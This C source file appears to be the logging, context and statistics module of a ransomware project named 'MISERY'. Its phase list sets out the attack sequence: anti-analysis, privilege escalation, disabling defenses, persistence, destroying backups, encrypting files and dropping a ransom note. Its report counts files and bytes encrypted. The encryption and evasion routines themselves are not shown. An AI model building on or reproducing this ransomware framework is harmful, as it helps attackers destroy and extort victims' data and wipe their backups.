#include "misery_config.h"
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

MISERY_GLOBAL_CTX g_misery_ctx = { 0 };

static const char *PhaseToString(MISERY_PHASE phase) {
    static const char *names[] = {
        "INIT",
        "ANTI_ANALYSIS",
        "PRIVILEGE_ESCALATION",
        "DEFENSE_DISABLE",
        "PERSISTENCE",
        "BACKUP_DESTROY",
        "ENCRYPTION",
        "RANSOM_NOTE",
        "CLEANUP",
        "COMPLETE",
        "ERROR"
    };
    if (phase <= PHASE_ERROR) return names[phase];
    return "UNKNOWN";
}

static const char *LogLevelToString(MISERY_LOG_LEVEL level) {
    switch (level) {
        case MISERY_LOG_INFO:  return "[INFO]";
        case MISERY_LOG_WARN:  return "[WARN]";
        case MISERY_LOG_ERROR: return "[ERR] ";
        default:               return "[????]";
    }
}

void MiseryLog(MISERY_LOG_LEVEL level, const char *fmt, ...) {
    if (!fmt) return;
    
    GetSystemTime(&g_misery_ctx.currentTime);
    
    char buffer[2048];
    va_list args;
    va_start(args, fmt);
    
    int written = vsnprintf(buffer, sizeof(buffer) - 1, fmt, args);
    va_end(args);
    
    if (written <= 0) return;
    buffer[written] = '\0';
    
    char fullMsg[2048];
    snprintf(fullMsg, sizeof(fullMsg),
        "[%02d:%02d:%02d] %s [%s] %s\n",
        g_misery_ctx.currentTime.wHour,
        g_misery_ctx.currentTime.wMinute,
        g_misery_ctx.currentTime.wSecond,
        LogLevelToString(level),
        PhaseToString(g_misery_ctx.currentPhase),
        buffer);
    
    printf("%s", fullMsg);
    
    if (g_misery_ctx.hLogFile && g_misery_ctx.hLogFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(g_misery_ctx.hLogFile, fullMsg, strlen(fullMsg), &written, NULL);
    }
}

bool MiseryPhaseTransition(MISERY_PHASE newPhase, bool success) {
    if (newPhase > PHASE_ERROR) {
        MiseryLog(MISERY_LOG_ERROR, "Invalid phase transition: %d", newPhase);
        return false;
    }
    
    if (success) {
        g_misery_ctx.phaseSuccess[g_misery_ctx.currentPhase] = true;
        MiseryLog(MISERY_LOG_INFO, "Phase [%s] completed successfully",
            PhaseToString(g_misery_ctx.currentPhase));
    } else {
        g_misery_ctx.phaseSuccess[g_misery_ctx.currentPhase] = false;
        MiseryLog(MISERY_LOG_WARN, "Phase [%s] encountered issues",
            PhaseToString(g_misery_ctx.currentPhase));
    }
    
    g_misery_ctx.lastPhase = g_misery_ctx.currentPhase;
    g_misery_ctx.currentPhase = newPhase;
    
    MiseryLog(MISERY_LOG_INFO, "Transitioning to phase [%s]",
        PhaseToString(newPhase));
    
    return true;
}

void MiseryReportStats(void) {
    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION STATISTICS ===");
    MiseryLog(MISERY_LOG_INFO, "Version: %s (Built: %s)", MISERY_VERSION, MISERY_BUILD_DATE);
    MiseryLog(MISERY_LOG_INFO, "Execution Time: %lu ms", g_misery_ctx.executionTimeMs);
    MiseryLog(MISERY_LOG_INFO, "Files Encrypted: %lu / %lu", 
        g_misery_ctx.filesEncrypted, 
        g_misery_ctx.filesEncrypted + g_misery_ctx.filesFailed);
    MiseryLog(MISERY_LOG_INFO, "Bytes Encrypted: %llu", g_misery_ctx.bytesEncrypted);
    
    printf("\n[PHASE COMPLETION REPORT]\n");
    for (int i = 0; i < PHASE_ERROR; i++) {
        printf("  %s: %s\n", PhaseToString(i), 
            g_misery_ctx.phaseSuccess[i] ? "✓ SUCCESS" : "✗ FAILED");
    }
}

bool MiseryInitContext(void) {
    GetSystemTime(&g_misery_ctx.startTime);
    g_misery_ctx.currentPhase = PHASE_INIT;
    g_misery_ctx.filesEncrypted = 0;
    g_misery_ctx.filesFailed = 0;
    g_misery_ctx.bytesEncrypted = 0;
    
    MiseryLog(MISERY_LOG_INFO, "=== MISERY v%s INITIALIZATION ===", MISERY_VERSION);
    return true;
}

void MiseryCleanupContext(void) {
    MiseryReportStats();
    
    if (g_misery_ctx.hLogFile && g_misery_ctx.hLogFile != INVALID_HANDLE_VALUE) {
        CloseHandle(g_misery_ctx.hLogFile);
        g_misery_ctx.hLogFile = INVALID_HANDLE_VALUE;
    }
}
